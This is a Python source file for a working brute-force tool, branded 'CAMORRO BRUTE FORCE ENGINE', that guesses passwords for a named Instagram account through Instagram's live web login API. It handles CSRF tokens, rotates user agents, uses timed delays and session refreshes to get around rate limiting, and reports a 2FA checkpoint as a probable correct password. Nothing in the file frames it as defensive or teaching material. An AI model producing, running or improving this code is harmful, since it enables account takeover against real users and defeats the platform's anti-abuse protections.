import re
import time
import random
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn,
    MofNCompleteColumn, TimeElapsedColumn, TimeRemainingColumn
)
from rich.table import Table

console = Console()


class BruteForce:
    """
    Instagram web login brute force.
    Flow:
      1) GET /accounts/login/  -> csrftoken + mid cookies
      2) POST /api/v1/web/accounts/login/ajax/
      3) parse authenticated / checkpoint / invalid / rate limit
    """

    LOGIN_PAGE = "https://www.instagram.com/accounts/login/"
    LOGIN_API = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"

    def __init__(self, username: str, passwords: list, delay_min: float = 3.0, delay_max: float = 5.0):
        self.username = username.lstrip("@").strip()
        self.passwords = passwords
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.found = None
        self.attempts = 0
        self.rate_hits = 0
        self.session = requests.Session()
        self.csrf = None

    def _ua(self) -> str:
        return random.choice([
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        ])

    def init_session(self) -> bool:
        console.print("[*] Initializing session...")
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": self._ua(),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Referer": self.LOGIN_PAGE,
        })
        try:
            r = self.session.get(self.LOGIN_PAGE, timeout=20)
            self.csrf = self.session.cookies.get("csrftoken")
            if not self.csrf:
                m = re.search(r'"csrf_token":"([^"]+)"', r.text)
                if m:
                    self.csrf = m.group(1)
            if not self.csrf:
                console.print("[red][✗] CSRF not found[/red]")
                return False
            console.print(f"[green][✓] Session initialized, CSRF: {self.csrf[:12]}...[/green]")
            return True
        except Exception as e:
            console.print(f"[red][✗] Session init failed: {e}[/red]")
            return False

    def _try_one(self, password: str) -> str:
        """
        Returns: success | checkpoint | invalid | rate | error
        """
        if not self.csrf:
            if not self.init_session():
                return "error"

        # Instagram accepts several password formats.
        # We try plain enc_password style still accepted on some web flows:
        # #PWD_INSTAGRAM_BROWSER:0:timestamp:password
        ts = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"

        headers = {
            "X-CSRFToken": self.csrf,
            "X-Requested-With": "XMLHttpRequest",
            "X-IG-App-ID": "936619743392459",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self.LOGIN_PAGE,
        }
        data = {
            "username": self.username,
            "enc_password": enc_password,
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "stopDeletionNonce": "",
            "trustedDeviceRecords": "{}",
        }

        try:
            r = self.session.post(self.LOGIN_API, headers=headers, data=data, timeout=20)
            # refresh csrf if rotated
            if self.session.cookies.get("csrftoken"):
                self.csrf = self.session.cookies.get("csrftoken")

            body = r.text.lower()
            try:
                j = r.json()
            except Exception:
                j = {}

            if j.get("authenticated") is True or j.get("status") == "ok" and j.get("user"):
                return "success"

            if "checkpoint_required" in body or j.get("checkpoint_url") or j.get("two_factor_required"):
                return "checkpoint"

            if r.status_code in (429, 403) or "please wait" in body or "rate" in body or "spam" in body:
                return "rate"

            if j.get("authenticated") is False or "invalid" in body or j.get("status") == "fail":
                return "invalid"

            # some challenges
            if "checkpoint" in body:
                return "checkpoint"

            return "invalid"
        except requests.RequestException:
            return "error"

    def run(self) -> str | None:
        total = len(self.passwords)
        console.print(Panel.fit(
            f"[bold red]⚡ CAMORRO BRUTE FORCE ENGINE[/bold red]\n"
            f"[white]Target: [cyan]@{self.username}[/cyan]\n"
            f"Total passwords: [green]{total}[/green]\n"
            f"Delay: [yellow]{self.delay_min}-{self.delay_max}s[/yellow] (anti rate-limit)",
            border_style="red"
        ))

        if not self.init_session():
            return None

        console.print("[*] Starting attack...")
        console.print(f"[!] Testing passwords with {self.delay_min}-{self.delay_max}s delays to avoid rate limiting\n")

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold red]{task.fields[pwd]}[/bold red]"),
            BarColumn(bar_width=30),
            MofNCompleteColumn(),
            TextColumn("{task.percentage:>5.1f}%"),
            TextColumn("•"),
            TextColumn("{task.fields[rate]} pwd/s"),
            TextColumn("•"),
            TimeElapsedColumn(),
            TextColumn("• ETA"),
            TimeRemainingColumn(),
            console=console,
            refresh_per_second=4,
        ) as progress:
            task = progress.add_task("brute", total=total, pwd="starting...", rate="0.00")
            start = time.time()

            for i, pwd in enumerate(self.passwords, 1):
                status = self._try_one(pwd)
                self.attempts += 1
                elapsed = max(time.time() - start, 0.001)
                rate = f"{self.attempts / elapsed:.2f}"

                progress.update(task, advance=1, pwd=pwd[:28], rate=rate)

                if status == "success":
                    self.found = pwd
                    console.print(f"\n[bold green]🏆 PASSWORD FOUND: {pwd}[/bold green]")
                    break

                if status == "checkpoint":
                    # often means password is correct but challenge/2FA hit
                    self.found = pwd
                    console.print(f"\n[bold yellow]⚠️ CHECKPOINT/2FA — password likely correct: {pwd}[/bold yellow]")
                    break

                if status == "rate":
                    self.rate_hits += 1
                    console.print(f"\n[yellow][!] Rate limited — sleeping 60s and refreshing session...[/yellow]")
                    time.sleep(60)
                    self.init_session()
                    continue

                if status == "error":
                    time.sleep(5)
                    self.init_session()

                # smart delay (exactly like your screenshot style)
                time.sleep(random.uniform(self.delay_min, self.delay_max))

        self.summary()
        return self.found

    def summary(self):
        t = Table(title="📊 Attack Summary")
        t.add_column("Metric", style="cyan")
        t.add_column("Value", style="green")
        t.add_row("Target", f"@{self.username}")
        t.add_row("Tried", str(self.attempts))
        t.add_row("Rate-limits", str(self.rate_hits))
        t.add_row("Result", self.found if self.found else "Not found")
        console.print(t)
